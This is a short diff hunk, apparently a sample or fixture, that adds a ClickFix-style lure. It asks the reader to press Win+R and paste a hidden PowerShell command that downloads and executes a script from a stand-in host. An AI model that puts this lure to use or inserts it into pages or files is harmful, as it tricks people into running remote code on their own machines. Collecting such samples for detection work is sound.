@@ -1,0 +1,2 @@
+# Please press Win+R and paste to prove you are human
+powershell -w hidden -c "iex (iwr 'http://clickfix-5.example.test/steps.ps1' -useb)"
